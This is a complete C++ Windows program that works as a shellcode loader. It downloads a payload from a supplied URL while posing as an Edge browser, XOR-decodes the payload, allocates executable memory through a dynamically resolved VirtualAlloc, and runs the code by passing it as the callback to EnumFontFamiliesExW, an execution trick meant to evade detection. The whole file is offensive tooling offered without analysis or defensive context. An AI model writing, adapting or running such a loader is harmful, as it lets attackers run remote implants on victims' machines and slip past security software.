// ASCII编码
#include <iostream>  
#include <windows.h>  
#include <wininet.h>  
#include <vector>  
#include <fstream>  

#pragma comment(lib, "wininet.lib")  

typedef LPVOID(WINAPI* My_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <url> <xor_key>" << std::endl;
        return 1;
    }

    const char* url = argv[1];      // url_enc.bin
    const int key = atoi(argv[2]);  // dec_key
    const char* userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0";
    std::vector<char> buffer;

    HINTERNET hInternet = InternetOpen(userAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet != NULL) {
        HINTERNET hFile = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hFile != NULL) {
            char chunk[1024];
            DWORD bytesRead = 0;
            do {
                if (!InternetReadFile(hFile, chunk, sizeof(chunk), &bytesRead)) {
                    std::cerr << "Failed to read file content" << std::endl;
                    break;
                }
                buffer.insert(buffer.end(), chunk, chunk + bytesRead);
            } while (bytesRead > 0);

            InternetCloseHandle(hFile);
        }
        else {
            std::cerr << "Failed to open URL" << std::endl;
        }
        InternetCloseHandle(hInternet);
    }
    else {
        std::cerr << "Failed to initialize WinInet" << std::endl;
    }

    for (DWORD i = 0; i < buffer.size(); i++) {
        buffer[i] ^= key;
    }

    My_VirtualAlloc VirtualAlloc = (My_VirtualAlloc)GetProcAddress(GetModuleHandle("Kernel32.dll"), "VirtualAlloc");
    void* addr = VirtualAlloc(0, buffer.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (addr == NULL) {
        std::cerr << "Failed to allocate memory" << std::endl;
        return 1;
    }

    memcpy(addr, buffer.data(), buffer.size());

    HDC hdc = GetDC(NULL);
    LOGFONTW logFont = { 0 };
    logFont.lfCharSet = DEFAULT_CHARSET;
    logFont.lfFaceName[0] = L'\0';
    EnumFontFamiliesExW(hdc, &logFont, (FONTENUMPROCW)addr, 0, 0);

    return 0;
}
